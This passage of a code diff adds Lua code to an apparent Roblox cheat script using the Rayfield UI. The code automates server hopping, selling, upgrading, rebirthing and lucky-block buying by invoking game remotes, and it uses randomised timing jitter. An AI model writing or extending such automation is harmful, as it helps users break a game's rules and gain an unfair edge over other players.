+            getgenv().OxyoAutoHopFrag    = false
+            getgenv().OxyoHopFragStopped = true
+            S.autoHopFragEnabled = false
+            if S.autoHopFragThread then
+                pcall(task.cancel, S.autoHopFragThread)
+                S.autoHopFragThread = nil
+            end
+            pcall(function()
+                local g = game:GetService("CoreGui"):FindFirstChild("OxyoStopHopGui")
+                if g then g:Destroy() end
+            end)
+            Rayfield:Notify({ Title = "⛔ Auto Hop Fragments", Content = "Stopped.", Duration = 3, Image = 4483362458 })
+            return
+        end
+        if getgenv().OxyoAutoHopCoin or getgenv().OxyoAutoHopGodly or getgenv().OxyoAutoHopCel then
+        end
+        getgenv().OxyoHopStopped      = false
+        getgenv().OxyoHopGodlyStopped = false
+        getgenv().OxyoHopCelStopped   = false
+        getgenv().OxyoHopFragStopped  = false
+        getgenv().OxyoAutoHopFrag    = true
+        S.autoHopFragEnabled = true
+        hideLava()
+        showStopHopGui()
+        S.autoHopFragThread = task.spawn(function()
+            runFragHopFarm("OxyoAutoHopFrag", "OxyoHopFragStopped")
+        end)
+    end,
+})
+
+HopTab:CreateSection("Auto Hop + Aqua Event")
+local hopAquaToggleRef
+hopAquaToggleRef = HopTab:CreateToggle({
+    Name         = "Auto Hop + Fish (Aqua Event)",
+    CurrentValue = false,
+    Flag         = "AutoHopAqua",
+    Callback     = function(Value)
+        if not Value then
+            getgenv().OxyoAutoHopAqua    = false
+            getgenv().OxyoHopAquaStopped = true
+            S.autoHopAquaEnabled         = false
+            if S.autoHopAquaThread then
+                pcall(task.cancel, S.autoHopAquaThread)
+                S.autoHopAquaThread = nil
+            end
+            pcall(function() if getgenv()._OxyoStopAquaLoop then getgenv()._OxyoStopAquaLoop() end end)
+            pcall(function()
+                local g = game:GetService("CoreGui"):FindFirstChild("OxyoStopHopGui")
+                if g then g:Destroy() end
+            end)
+            Rayfield:Notify({ Title = "⛔ Auto Hop Aqua", Content = "Stopped.", Duration = 3, Image = 4483362458 })
+            return
+        end
+        getgenv().OxyoHopStopped      = false
+        getgenv().OxyoHopAquaStopped  = false
+        getgenv().OxyoAutoHopAqua     = true
+        S.autoHopAquaEnabled = true
+        hideLava()
+        showStopHopGui()
+        S.autoHopAquaThread = task.spawn(function()
+            Rayfield:Notify({ Title = "🌊 Auto Hop Aqua", Content = "Checking current server...", Duration = 2, Image = 4483362458 })
+            task.wait(4)
+            while getgenv().OxyoAutoHopAqua and not getgenv().OxyoHopAquaStopped do
+                if _isAquaActive() then
+                    Rayfield:Notify({ Title = "🌊 Aqua Event!", Content = "Active — starting Auto Fish!", Duration = 3, Image = 4483362458 })
+                    if not _getAquaRemotes() then
+                        Rayfield:Notify({ Title = "🌊 Auto Hop Aqua", Content = "Remotes missing — hopping...", Duration = 2, Image = 4483362458 })
+                        task.wait(3)
+                        if getgenv().OxyoAutoHopAqua and not getgenv().OxyoHopAquaStopped then
+                            task.spawn(ServerHop)
+                        end
+                        return
+                    end
+                    _aquaRunning = true
+                    _startAquaLoop()
+                    local waited = 0
+                    while _aquaRunning and getgenv().OxyoAutoHopAqua and not getgenv().OxyoHopAquaStopped do
+                        task.wait(5)
+                        waited = waited + 5
+                        if not _isAquaActive() and waited > 10 then
+                            _stopAquaLoop()
+                            break
+                        end
+                    end
+                    if not getgenv().OxyoAutoHopAqua or getgenv().OxyoHopAquaStopped then return end
+                    Rayfield:Notify({ Title = "🌊 Auto Hop Aqua", Content = "Aqua Event ended — hopping...", Duration = 2, Image = 4483362458 })
+                    task.wait(2)
+                    if getgenv().OxyoAutoHopAqua and not getgenv().OxyoHopAquaStopped then
+                        task.spawn(ServerHop)
+                    end
+                    return
+                else
+
+                    local _aquaGraceEnd = tick() + 8
+                    while not _isAquaActive() and tick() < _aquaGraceEnd
+                        and getgenv().OxyoAutoHopAqua and not getgenv().OxyoHopAquaStopped do
+                        task.wait(1)
+                    end
+                    if _isAquaActive() then continue end
+
+                    local queuedSecs = _getAquaQueuedTime()
+                    if queuedSecs and queuedSecs > 0 and queuedSecs <= 1200 then
+                        local mins = math.floor(queuedSecs / 60)
+                        local secs = queuedSecs % 60
+                        Rayfield:Notify({
+                            Title   = "🌊 Aqua Event Incoming!",
+                            Content = string.format("Queued in %dm %ds — waiting on this server!", mins, secs),
+                            Duration = 6, Image = 4483362458,
+                        })
+
+                        local waited2 = 0
+                        while waited2 < queuedSecs + 10
+                            and getgenv().OxyoAutoHopAqua
+                            and not getgenv().OxyoHopAquaStopped
+                            and not _isAquaActive() do
+                            task.wait(2)
+                            waited2 = waited2 + 2
+                        end
+
+                        continue
+                    end
+                    task.wait(math.random(5, 10))
+                    if getgenv().OxyoAutoHopAqua and not getgenv().OxyoHopAquaStopped then
+                        task.spawn(ServerHop)
+                    end
+                    return
+                end
+            end
+        end)
+    end,
+})
+
+HopTab:CreateSection("📊 Session Stats")
+local _hopStatsPara = HopTab:CreateParagraph({
+    Title   = "Hop Stats",
+    Content = "Idle",
+})
+local _hopCount = 0
+local _hopStart = 0
+task.spawn(function()
+    while true do
+        task.wait(10)
+        if isAnyHopActive() then
+            if _hopStart == 0 then _hopStart = tick() end
+            local elapsed = tick() - _hopStart
+            local mins = math.floor(elapsed / 60)
+            local secs = math.floor(elapsed % 60)
+            pcall(function()
+                _hopStatsPara:Set({
+                    Title   = "📊 Hop Session",
+                    Content = string.format("⏱ Running: %02d:%02d\nMode: %s",
+                        mins, secs,
+                        getgenv().OxyoAutoHopCoin  and "🪙 Coin" or
+                        getgenv().OxyoAutoHopGodly and "👑 Godly" or
+                        getgenv().OxyoAutoHopCel   and "🌌 Celestial" or
+                        getgenv().OxyoAutoHopFrag  and "🔷 Fragments" or
+                        getgenv().OxyoAutoHopAqua  and "🌊 Aqua" or "—"
+                    ),
+                })
+            end)
+        else
+            _hopStart = 0
+            pcall(function()
+                _hopStatsPara:Set({ Title = "Hop Stats", Content = "Idle" })
+            end)
+        end
+    end
+end)
+getgenv().OxyoAutoSafe = true
+CollectorTab:CreateSection("Auto Upgrade")
+CollectorTab:CreateToggle({
+    Name         = "Auto Upgrade",
+    CurrentValue = false,
+    Flag         = "AutoUpgrade",
+    Callback     = function(Value)
+        auto.upgradeEnabled = Value
+        if Value then
+            auto.upgradeThread = task.spawn(function()
+                local upgradeRemote = nil
+                pcall(function() upgradeRemote = ReplicatedStorage.Events.Upgrade end)
+                while auto.upgradeEnabled do
+                    pcall(function()
+                        local gf = workspace:FindFirstChild("GameFolder")
+                        local plots = gf and gf:FindFirstChild("Plots")
+                        if not plots then return end
+                        for _, plot in pairs(plots:GetChildren()) do
+                            local brainrots = plot:FindFirstChild("Brainrots")
+                            if not brainrots then continue end
+                            for _, br in pairs(brainrots:GetChildren()) do
+                                local ok, owner = pcall(function() return br:GetAttribute("Owner") end)
+                                if ok and owner and tostring(owner) == tostring(player.UserId) then
+                                    for _, b in pairs(brainrots:GetChildren()) do
+                                        local slot = tonumber(b.Name)
+                                        if slot then
+                                            pcall(function() upgradeRemote:InvokeServer(slot) end)
+                                            task.wait(0.08)
+                                        end
+                                    end
+                                    break
+                                end
+                            end
+                        end
+                    end)
+                    task.wait(2)
+                end
+            end)
+        else
+            if auto.upgradeThread then pcall(task.cancel, auto.upgradeThread) auto.upgradeThread = nil end
+        end
+    end,
+})
+CollectorTab:CreateSection("Auto Sell")
+CollectorTab:CreateSlider({
+    Name         = "Sell Threshold",
+    Range        = {5, 50},
+    Increment    = 5,
+    Suffix       = "Brainrots",
+    CurrentValue = 50,
+    Flag         = "SellThreshold",
+    Callback     = function(Value) auto.sellThreshold = Value end,
+})
+CollectorTab:CreateSlider({
+    Name         = "Sell Every X Seconds  (0 = off)",
+    Range        = {0, 300},
+    Increment    = 10,
+    Suffix       = "sec",
+    CurrentValue = 0,
+    Flag         = "SellTimerInterval",
+    Callback     = function(Value) auto.sellTimer = Value end,
+})
+CollectorTab:CreateToggle({
+    Name         = "Auto Sell",
+    CurrentValue = false,
+    Flag         = "AutoSell",
+    Callback     = function(Value)
+        auto.sellEnabled = Value
+        if Value then
+            auto.sellThread = task.spawn(function()
+                local lastTimerSell = tick()
+                while auto.sellEnabled do
+                    local realCount     = getPlotBrainrotCount()
+                    local elapsed       = tick() - lastTimerSell
+                    local shouldByCount = realCount >= auto.sellThreshold
+                    local shouldByTimer = auto.sellTimer > 0 and elapsed >= auto.sellTimer and realCount > 0
+                    if shouldByCount or shouldByTimer then
+                        if doSell() then
+                            lastTimerSell = tick()
+                            Rayfield:Notify({
+                                Title    = "Auto Sell",
+                                Content  = "Sold " .. realCount .. " Brainrots!",
+                                Duration = 2,
+                                Image    = 4483362458,
+                            })
+                        end
+                        task.wait(3)
+                    else
+                        task.wait(2)
+                    end
+                end
+            end)
+        else
+            if auto.sellThread then pcall(task.cancel, auto.sellThread) auto.sellThread = nil end
+        end
+    end,
+})
+CollectorTab:CreateButton({
+    Name     = "Sell Now (Manual)",
+    Callback = function()
+        if doSell() then
+            Rayfield:Notify({ Title = "Sold!", Content = "All Brainrots sold successfully!", Duration = 3, Image = 4483362458 })
+        else
+            Rayfield:Notify({ Title = "Error", Content = "Failed to sell — make sure the game is running.", Duration = 4, Image = 4483362458 })
+        end
+    end,
+})
+do
+do
+local _rebirthRemote = ReplicatedStorage:FindFirstChild("Events")
+    and ReplicatedStorage.Events:FindFirstChild("Rebirth")
+local function _getRebirthReqs()
+    local ok, insider = pcall(function()
+        return player.PlayerGui.HUD.Rebirth.InsiderFrame.Insider
+    end)
+    if not ok or not insider then return nil end
+    local reqSpeed, curSpeed
+    pcall(function()
+        local lbl = insider.RequirementBar.Name
+        if lbl and lbl:IsA("TextLabel") then
+            local cur, req = lbl.Text:match("(%d+)/(%d+)%s*Speed")
+            curSpeed = tonumber(cur)
+            reqSpeed = tonumber(req)
+        end
+    end)
+    local reqBrainrot
+    pcall(function()
+        local nt = insider.Brainrots.RebirthReward.NameText
+        if nt and nt:IsA("TextLabel") and nt.Text ~= "" then
+            reqBrainrot = nt.Text
+        end
+    end)
+    return { reqSpeed = reqSpeed, curSpeed = curSpeed, reqBrainrot = reqBrainrot }
+end
+local function _openRebirthMenu()
+    pcall(function()
+        local pg  = player:FindFirstChild("PlayerGui")
+        local hud = pg and pg:FindFirstChild("HUD")
+        local btn = hud and hud:FindFirstChild("LeftButtons")
+            and hud.LeftButtons:FindFirstChild("Rebirth")
+        if btn then btn.MouseButton1Click:Fire() end
+    end)
+end
+local function _brainrotOnPlot(name)
+    local nameLow = name:lower()
+    local gf = workspace:FindFirstChild("GameFolder")
+    local plots = gf and gf:FindFirstChild("Plots")
+    if not plots then return false end
+    for _, plot in pairs(plots:GetChildren()) do
+        local ok2, owner = pcall(function() return plot:GetAttribute("Owner") end)
+        if ok2 and owner and tostring(owner) == tostring(player.UserId) then
+            local brs = plot:FindFirstChild("Brainrots")
+            if brs then
+                for _, b in pairs(brs:GetChildren()) do
+                    local dn = (b:GetAttribute("DisplayName") or b.Name):lower()
+                    if dn:find(nameLow, 1, true) or nameLow:find(dn, 1, true) then
+                        return true
+                    end
+                end
+            end
+        end
+    end
+    return false
+end
+local function _findInWorld(name)
+    local nameLow = name:lower()
+    for _, entry in ipairs(monitorData.brainrots) do
+        if entry.obj and entry.obj.Parent then
+            local dn = (entry.name or ""):lower()
+            if dn:find(nameLow, 1, true) or nameLow:find(dn, 1, true) then
+                return entry
+            end
+        end
+    end
+    return nil
+end
+local function _doRebirth()
+    if not _rebirthRemote then
+        _rebirthRemote = ReplicatedStorage:FindFirstChild("Events")
+            and ReplicatedStorage.Events:FindFirstChild("Rebirth")
+    end
+    if not _rebirthRemote then return false end
+    local ok2 = pcall(function() _rebirthRemote:InvokeServer("Rebirth") end)
+    return ok2
+end
+local function _runRebirthLoop()
+    while auto.rebirthEnabled do
+        task.wait(5)
+        pcall(function()
+            if _doRebirth() then
+                Rayfield:Notify({
+                    Title   = "Rebirth Done!",
+                    Content = "Rebirth successful!",
+                    Duration = 5,
+                    Image   = 4483362458,
+                })
+                task.wait(6)
+            end
+        end)
+    end
+end
+CollectorTab:CreateSection("Auto Rebirth")
+CollectorTab:CreateToggle({
+    Name         = "Auto Rebirth",
+    CurrentValue = false,
+    Flag         = "AutoRebirth",
+    Callback     = function(Value)
+        auto.rebirthEnabled = Value
+        if Value then
+            auto.rebirthThread = task.spawn(_runRebirthLoop)
+            Rayfield:Notify({
+                Title   = "Auto Rebirth ON",
+                Content = "Watching requirements - will rebirth when ready.",
+                Duration = 4,
+                Image   = 4483362458,
+            })
+        else
+            if auto.rebirthThread then
+                pcall(task.cancel, auto.rebirthThread)
+                auto.rebirthThread = nil
+            end
+        end
+    end,
+})
+CollectorTab:CreateButton({
+    Name     = "Rebirth Now (Manual)",
+    Callback = function()
+        task.spawn(function()
+            _openRebirthMenu()
+            task.wait(0.3)
+            if _doRebirth() then
+                Rayfield:Notify({ Title = "Rebirth Done!", Content = "Success!", Duration = 4, Image = 4483362458 })
+            else
+                Rayfield:Notify({ Title = "Rebirth Failed", Content = "Server rejected rebirth.", Duration = 4, Image = 4483362458 })
+            end
+        end)
+    end,
+})
+end
+local statusParagraph = BrainrotStatusTab:CreateParagraph({
+    Title   = "Brainrots in World",
+    Content = "Scanning...",
+})
+BrainrotStatusTab:CreateSection("Live Brainrot Status")
+task.spawn(function()
+    local lastCount = -1
+    task.wait(1)
+    while true do
+        task.wait(3)
+        pcall(function()
+            local snapshot = monitorData.brainrots
+            local alive = 0
+            for _, entry in ipairs(snapshot) do
+                if entry.obj and entry.obj.Parent then alive = alive + 1 end
+            end
+            if alive == lastCount then return end
+            lastCount = alive
+            if alive == 0 then
+                pcall(function()
+                    statusParagraph:Set({ Title = "Brainrots in World (0)", Content = "No Brainrots in world right now." })
+                end)
+                return
+            end
+            local lines = {}
+            for _, entry in ipairs(snapshot) do
+                if entry.obj and entry.obj.Parent then
+                    local traitStr = ""
+                    local td = S.traitData[entry.obj]
+                    if td and #td.traitNames > 0 then
+                        traitStr = " [TRAIT: " .. table.concat(td.traitNames, "+") .. "]"
+                    end
+                    table.insert(lines, "[" .. (entry.rarity or "?") .. "] " .. (entry.name or "?") .. " — " .. (entry.mutation or "Normal") .. traitStr)
+                end
+            end
+            pcall(function()
+                statusParagraph:Set({
+                    Title   = "Brainrots in World (" .. #lines .. ")",
+                    Content = #lines > 0 and table.concat(lines, "\n") or "Nothing right now.",
+                })
+            end)
+        end)
+    end
+end)
+end
+BrainrotStatusTab:CreateSection("Mutation Alert")
+BrainrotStatusTab:CreateDropdown({
+    Name            = "Alert for Mutations",
+    Options         = ALERT_MUTATIONS,
+    CurrentOption   = {},
+    MultipleOptions = true,
+    Flag            = "MutationAlertDropdown",
+    Callback        = function(Options) S.mutationAlertDropdown = Options end,
+})
+BrainrotStatusTab:CreateToggle({
+    Name         = "Mutation Alert",
+    CurrentValue = false,
+    Flag         = "MutationAlert",
+    Callback     = function(Value)
+        auto.alertEnabled = Value
+        if Value then
+            local lastSeen = {}
+            auto.alertThread = task.spawn(function()
+                while auto.alertEnabled do
+                    pcall(function()
+                        for _, e in ipairs(monitorData.mutations) do
+                            if e.obj and e.obj.Parent then
+                                local alertSet = {}
+                                for _, m in ipairs(S.mutationAlertDropdown) do alertSet[m] = true end
+                                local shouldAlert = (#S.mutationAlertDropdown == 0) or alertSet[e.mutation]
+                                local key = e.name .. "_" .. e.mutation .. "_" .. e.rarity
+                                if shouldAlert and not lastSeen[key] then
+                                    lastSeen[key] = true
+                                    Rayfield:Notify({
+                                        Title    = "Mutation Detected!",
+                                        Content  = "[" .. e.mutation .. "] " .. e.name .. "\nZone: " .. e.rarity,
+                                        Duration = 6,
+                                        Image    = 4483362458,
+                                    })
+                                end
+                            end
+                        end
+                        local alive = {}
+                        for _, e in ipairs(monitorData.mutations) do
+                            alive[e.name .. "_" .. e.mutation .. "_" .. e.rarity] = true
+                        end
+                        for k in pairs(lastSeen) do
+                            if not alive[k] then lastSeen[k] = nil end
+                        end
+                    end)
+                    task.wait(2)
+                end
+            end)
+        else
+            if auto.alertThread then pcall(task.cancel, auto.alertThread) auto.alertThread = nil end
+        end
+    end,
+})
+LuckyStatusTab:CreateSection("Live Status")
+do
+local luckyStatusPara = LuckyStatusTab:CreateParagraph({
+    Title   = "Lucky Block Status",
+    Content = "Scanning...",
+})
+task.spawn(function()
+    task.wait(2)
+    while true do
+        task.wait(3)
+        pcall(function()
+            local blocks       = getLuckyBlocks()
+            local activeLines  = {}
+            local pendingLines = {}
+            for _, b in ipairs(blocks) do
+                local bname = tostring(b.name or "?")
+                if b.active then
+                    table.insert(activeLines, "✅ " .. bname .. "  (" .. math.floor(b.pos.X) .. ", " .. math.floor(b.pos.Y) .. ", " .. math.floor(b.pos.Z) .. ")")
+                else
+                    table.insert(pendingLines, "⏳ " .. bname .. " — Respawning...")
+                end
+            end
+            local total   = #blocks
+            local active  = #activeLines
+            local content = "Active: " .. active .. " / " .. total .. "\n\n"
+                          .. table.concat(activeLines, "\n")
+                          .. (#pendingLines > 0 and ("\n\n" .. table.concat(pendingLines, "\n")) or "")
+            pcall(function()
+                luckyStatusPara:Set({ Title = "Lucky Block Status (" .. active .. "/" .. total .. ")", Content = content })
+            end)
+        end)
+    end
+end)
+end
+GearTab:CreateSection("Speed Upgrade")
+GearTab:CreateButton({
+    Name     = "+1 Speed",
+    Callback = function()
+        local ok, result = pcall(function() return ReplicatedStorage.Events.Speed:InvokeServer("Speed", 1) end)
+        if not ok or (type(result) == "string" and result:lower():find("enough")) then
+            Rayfield:Notify({ Title = "Not Enough Cash", Content = "You don't have enough cash for +1 Speed.", Duration = 4, Image = 4483362458 })
+        else
+            Rayfield:Notify({ Title = "Upgraded!", Content = "+1 Speed purchased!", Duration = 3, Image = 4483362458 })
+        end
+    end,
+})
+GearTab:CreateButton({
+    Name     = "+5 Speed",
+    Callback = function()
+        local ok, result = pcall(function() return ReplicatedStorage.Events.Speed:InvokeServer("Speed", 5) end)
+        if not ok or (type(result) == "string" and result:lower():find("enough")) then
+            Rayfield:Notify({ Title = "Not Enough Cash", Content = "You don't have enough cash for +5 Speed.", Duration = 4, Image = 4483362458 })
+        else
+            Rayfield:Notify({ Title = "Upgraded!", Content = "+5 Speed purchased!", Duration = 3, Image = 4483362458 })
+        end
+    end,
+})
+GearTab:CreateButton({
+    Name     = "+10 Speed",
+    Callback = function()
+        local ok, result = pcall(function() return ReplicatedStorage.Events.Speed:InvokeServer("Speed", 10) end)
+        if not ok or (type(result) == "string" and result:lower():find("enough")) then
+            Rayfield:Notify({ Title = "Not Enough Cash", Content = "You don't have enough cash for +10 Speed.", Duration = 4, Image = 4483362458 })
+        else
+            Rayfield:Notify({ Title = "Upgraded!", Content = "+10 Speed purchased!", Duration = 3, Image = 4483362458 })
+        end
+    end,
+})
+GearTab:CreateSection("Carry Upgrade")
+GearTab:CreateButton({
+    Name     = "+1 Carry",
+    Callback = function()
+        local ok, result = pcall(function() return ReplicatedStorage.Events.Carry:InvokeServer("Carry") end)
+        if not ok or (type(result) == "string" and result:lower():find("enough")) then
+            Rayfield:Notify({ Title = "Not Enough Cash", Content = "You don't have enough cash for +1 Carry.", Duration = 4, Image = 4483362458 })
+        else
+            Rayfield:Notify({ Title = "Upgraded!", Content = "+1 Carry purchased!", Duration = 3, Image = 4483362458 })
+        end
+    end,
+})
+GearTab:CreateSection("Buy Gear")
+local function resolveGearKey(opt)
+    if not opt then return nil end
+    for key, data in pairs(GEAR_REGISTRY) do
+        if data.displayName == opt then return key end
+    end
+    local optL = opt:lower()
+    for key, data in pairs(GEAR_REGISTRY) do
+        if data.displayName:lower() == optL then return key end
+    end
+    return nil
+end
+do
+    local gearOptions = {}
+    for key, data in pairs(GEAR_REGISTRY) do
+        if key:sub(1,3) ~= "LB_" then
+            table.insert(gearOptions, data.displayName)
+        end
+    end
+    table.sort(gearOptions)
+    GearTab:CreateDropdown({
+        Name            = "Select Gear",
+        Options         = gearOptions,
+        CurrentOption   = {},
+        MultipleOptions = true,
+        Flag            = "GearMultiDropdown",
+        Callback        = function(Options)
+            S.selectedGears = {}
+            S.selectedGear  = nil
+            local list = type(Options) == "table" and Options or {Options}
+            for _, opt in ipairs(list) do
+                local key = resolveGearKey(opt)
+                if key then
+                    table.insert(S.selectedGears, key)
+                    if not S.selectedGear then S.selectedGear = key end
+                end
+            end
+        end,
+    })
+end
+GearTab:CreateButton({
+    Name     = "Buy Selected Gear",
+    Callback = function()
+        if not S.selectedGear then
+            Rayfield:Notify({ Title = "Gear Shop", Content = "Select a gear from the list first!", Duration = 3, Image = 4483362458 })
+            return
+        end
+        task.spawn(function()
+            do
+            local data   = GEAR_REGISTRY[S.selectedGear]
+            local result = buyGear(S.selectedGear)
+            if result == BUY_RESULT.SUCCESS then
+                Rayfield:Notify({ Title = "✅ Purchased!", Content = data.displayName .. " bought!", Duration = 4, Image = 4483362458 })
+            elseif result == BUY_RESULT.OUT_OF_STOCK then
+                Rayfield:Notify({ Title = "Out of Stock", Content = data.displayName .. " is currently out of stock.", Duration = 4, Image = 4483362458 })
+            elseif result == BUY_RESULT.NO_COINS then
+                Rayfield:Notify({ Title = "Not Enough Coins", Content = "Need " .. data.coinPrice .. " coins for " .. data.displayName, Duration = 4, Image = 4483362458 })
+            elseif result == BUY_RESULT.NOT_IN_SHOP then
+                Rayfield:Notify({ Title = "Not in Shop", Content = data.displayName .. " is not available right now.", Duration = 4, Image = 4483362458 })
+            end
+            end
+        end)
+    end,
+})
+end)()
+;(function()
+GearTab:CreateSection("Buy Lucky Block")
+do
+    local lbOptions = {
+        "Common Lucky Block",
+        "Rare Lucky Block",
+        "Epic Lucky Block",
+        "Legendary Lucky Block",
+        "Mythic Lucky Block",
+        "Secret Lucky Block",
+        "Celestial Lucky Block",
+        "Godly Lucky Block",
+    }
+    local LB_DISPLAY_TO_KEY = {
+        ["Common Lucky Block"]    = "LB_Common",
+        ["Rare Lucky Block"]      = "LB_Rare",
+        ["Epic Lucky Block"]      = "LB_Epic",
+        ["Legendary Lucky Block"] = "LB_Legendary",
+        ["Mythic Lucky Block"]    = "LB_Mythic",
+        ["Secret Lucky Block"]    = "LB_Secret",
+        ["Celestial Lucky Block"] = "LB_Celestial",
+        ["Godly Lucky Block"]     = "LB_Godly",
+    }
+    GearTab:CreateDropdown({
+        Name            = "Select Lucky Block",
+        Options         = lbOptions,
+        CurrentOption   = {},
+        MultipleOptions = true,
+        Flag            = "LBMultiDropdown",
+        Callback        = function(Options)
+            S.selectedLBs = {}
+            local list = type(Options) == "table" and Options or {Options}
+            for _, opt in ipairs(list) do
+                local key = LB_DISPLAY_TO_KEY[opt]
+                if key then table.insert(S.selectedLBs, key) end
+            end
+            getgenv().OxyoSelectedLBs = S.selectedLBs
+        end,
+    })
+end
+GearTab:CreateButton({
+    Name     = "Buy Selected Lucky Block",
+    Callback = function()
+        if not S.selectedLBs or #S.selectedLBs == 0 then
+            Rayfield:Notify({ Title = "Lucky Block", Content = "Select at least one Lucky Block first!", Duration = 3, Image = 4483362458 })
+            return
+        end
+        task.spawn(function()
+            for _, lbKey in ipairs(S.selectedLBs) do
+                local data = GEAR_REGISTRY[lbKey]
+                if not data then continue end
+                local result = buyGear(lbKey)
+                if result == BUY_RESULT.SUCCESS then
+                    Rayfield:Notify({ Title = "✅ Purchased!", Content = data.displayName .. " bought!", Duration = 4, Image = 4483362458 })
+                elseif result == BUY_RESULT.OUT_OF_STOCK then
+                    Rayfield:Notify({ Title = "Out of Stock", Content = data.displayName .. " is out of stock.", Duration = 4, Image = 4483362458 })
+                elseif result == BUY_RESULT.NO_COINS then
+                    Rayfield:Notify({ Title = "Not Enough Coins", Content = "Not enough coins for " .. data.displayName, Duration = 4, Image = 4483362458 })
+                elseif result == BUY_RESULT.NOT_IN_SHOP then
+                    Rayfield:Notify({ Title = "Not in Shop", Content = data.displayName .. " not available.", Duration = 4, Image = 4483362458 })
+                end
+                task.wait(0.5)
+            end
+        end)
+    end,
+})
+end)()
+;(function()
+GearTab:CreateSection("Auto Buy Lucky Block")
+local _lbBuyStatsPara = GearTab:CreateParagraph({
+    Title   = "📊 Auto Buy LB Stats",
+    Content = "Idle",
+})
+local _lbBuyStats = { total=0, attempts=0, startTick=0 }
+local _lastLBNotifTime = {}
+local function _throttledLBNotify(rtype, title, content)
+    local now  = tick()
+    local last = _lastLBNotifTime[rtype] or 0
+    if now - last < 30 then return end
+    _lastLBNotifTime[rtype] = now
+    pcall(function()
+        Rayfield:Notify({ Title=title, Content=content, Duration=3, Image=4483362458 })
+    end)
+end
+local function _updateLBStatsHUD()
+    if not auto.buyLBEnabled then return end
+    pcall(function()
+        local elapsed = tick() - _lbBuyStats.startTick
+        local mins    = math.floor(elapsed / 60)
+        local secs    = math.floor(elapsed % 60)
+        local names   = {}
+        for _, k in ipairs(S.selectedLBs or {}) do
+            local d = GEAR_REGISTRY[k]
+            if d then table.insert(names, d.displayName:gsub(" Lucky Block",""):gsub(" %(World%)","")) end
+        end
+        _lbBuyStatsPara:Set({
+            Title   = "📊 Auto Buy LB — " .. (table.concat(names, ", ") ~= "" and table.concat(names, ", ") or "—"),
+            Content = string.format(
+                "✅ Bought: %d  •  🔄 Attempts: %d\n⏱ Running: %02d:%02d",
+                _lbBuyStats.total, _lbBuyStats.attempts, mins, secs),
+        })
+    end)
+end
+local function _resetAutoBuyLBFlag()
+    pcall(function()
+        local flag = Rayfield.Flags and Rayfield.Flags["AutoBuyLB"]
+        if flag then flag:Set(false) end
+    end)
+end
+local function _ensureRemote()
+    if _VP_REMOTE and _VP_REMOTE.Parent then return true end
+    local ok, found = pcall(function()
+        return ReplicatedStorage:WaitForChild("Events", 3):WaitForChild("VendorPurchase", 3)
+    end)
+    if ok and found then _VP_REMOTE = found return true end
+    return false
+end
+local function _runBuyLBLoop()
+    local waitDeadline = tick() + 20
+    while auto.buyLBEnabled and tick() < waitDeadline do
+        local lbs = S.selectedLBs
+        if lbs and #lbs > 0 then break end
+        if getgenv().OxyoSelectedLBs and #getgenv().OxyoSelectedLBs > 0 then
+            S.selectedLBs = getgenv().OxyoSelectedLBs
+            break
+        end
+        task.wait(0.3)
+    end
+    if not S.selectedLBs or #S.selectedLBs == 0 then
+        Rayfield:Notify({ Title="Auto Buy LB", Content="Select at least one Lucky Block first!", Duration=3, Image=4483362458 })
+        auto.buyLBEnabled = false
+        _resetAutoBuyLBFlag()
+        return
+    end
+    local names = {}
+    for _, k in ipairs(S.selectedLBs) do
+        local d = GEAR_REGISTRY[k]
+        if d then table.insert(names, d.displayName) end
+    end
+    Rayfield:Notify({
+        Title   = "🌙 LB Auto Buy Active",
+        Content = table.concat(names, ", ") .. "\nRuns forever — toggle OFF to stop.",
+        Duration = 4,
+        Image   = 4483362458,
+    })
+    while auto.buyLBEnabled do
+        _lbBuyStats.attempts = _lbBuyStats.attempts + 1
+        if not _ensureRemote() then task.wait(3) continue end
+        if (not S.selectedLBs or #S.selectedLBs == 0) and getgenv().OxyoSelectedLBs and #getgenv().OxyoSelectedLBs > 0 then
+            S.selectedLBs = getgenv().OxyoSelectedLBs
+        end
+        local lbsToTry = S.selectedLBs and #S.selectedLBs > 0 and S.selectedLBs or {}
+        if #lbsToTry == 0 then task.wait(2) continue end
+        local deadline = tick() + 10
+        while tick() < deadline do
+            local char = Players.LocalPlayer.Character
+            local hum  = char and char:FindFirstChildOfClass("Humanoid")
+            if hum and hum.Health > 0 then break end
+            task.wait(0.5)
+        end
+        for _, lbKey in ipairs(lbsToTry) do
+            if not auto.buyLBEnabled then break end
+            local data = GEAR_REGISTRY[lbKey]
+            if not data then continue end
+            local result
+            pcall(function() result = buyGear(lbKey) end)
+            result = result or BUY_RESULT.NOT_IN_SHOP
+            if result == BUY_RESULT.SUCCESS then
+                _lbBuyStats.total = _lbBuyStats.total + 1
+                _throttledLBNotify("success","✅ LB Purchased!", data.displayName .. " — " .. _lbBuyStats.total .. " bought")
+            elseif result == BUY_RESULT.OUT_OF_STOCK then
+                _throttledLBNotify("oos","⏳ LB Out of Stock", data.displayName)
+            elseif result == BUY_RESULT.NO_COINS then
+                _throttledLBNotify("coins","💰 No Coins", "Not enough coins for " .. data.displayName)
+            end
+            task.wait(0.5)
+        end
+        _updateLBStatsHUD()
+        local jitter = (math.random(0, 600) / 1000) - 0.3
+        task.wait(2 + jitter)
+    end
+end
+GearTab:CreateToggle({
+    Name         = "Auto Buy Lucky Block",
+    CurrentValue = false,
+    Flag         = "AutoBuyLB",
+    Callback     = function(Value)
+        auto.buyLBEnabled = Value
+        if Value then getgenv().OxyoAutoBuyLB = true end
+        if Value then
+            if (not S.selectedLBs or #S.selectedLBs == 0)
+            and getgenv().OxyoSelectedLBs and #getgenv().OxyoSelectedLBs > 0 then
+                S.selectedLBs = getgenv().OxyoSelectedLBs
+            end
+            _lbBuyStats = { total=0, attempts=0, startTick=tick() }
+            _lastLBNotifTime = {}
+            auto.buyLBThread = task.spawn(_runBuyLBLoop)
+            task.spawn(function()
+                task.wait(15)
+                while auto.buyLBEnabled do
+                    task.wait(10)
+                    if auto.buyLBEnabled and (auto.buyLBThread == nil or coroutine.status(auto.buyLBThread) == "dead") then
+                        auto.buyLBThread = task.spawn(_runBuyLBLoop)
+                    end
+                end
+            end)
+        else
+            if auto.buyLBThread then pcall(task.cancel, auto.buyLBThread) auto.buyLBThread = nil end
+            if _lbBuyStats.startTick > 0 then
+                getgenv().OxyoAutoBuyLB = false
+                pcall(function()
+                    _lbBuyStatsPara:Set({
+                        Title   = "📊 Auto Buy LB — Stopped",
+                        Content = string.format("Session ended.\n✅ Bought: %d  •  🔄 Attempts: %d", _lbBuyStats.total, _lbBuyStats.attempts),
+                    })
+                end)
+                Rayfield:Notify({
+                    Title   = "Auto Buy LB Stopped",
